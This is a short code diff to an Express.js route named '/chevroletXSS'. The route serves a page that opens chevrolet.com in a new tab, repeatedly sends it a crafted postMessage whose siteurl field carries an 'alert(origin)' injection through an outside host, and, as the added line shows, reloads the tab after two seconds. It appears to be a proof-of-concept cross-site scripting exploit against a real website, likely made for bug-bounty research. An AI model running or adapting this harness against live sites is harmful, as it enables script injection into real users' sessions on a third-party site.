@@ -31,6 +31,7 @@ app.get("/chevroletXSS", function (req, res) {
    let tab = open("https://www.chevrolet.com");
    setInterval(()=>{
    tab.postMessage(\`{"nonMP":"xsss","siteurl":"https://missoumsaid.com/test?input=alert(origin);////","lang":"xsss","country":"xsss","currency":"xsss","action":"xsss","value":"xsss","source":"xsss"}\`,"*")},1);
+   setTimeout(()=>{tab.location.replace("https://www.chevrolet.com")},2000);
    </script>`);
 });
 
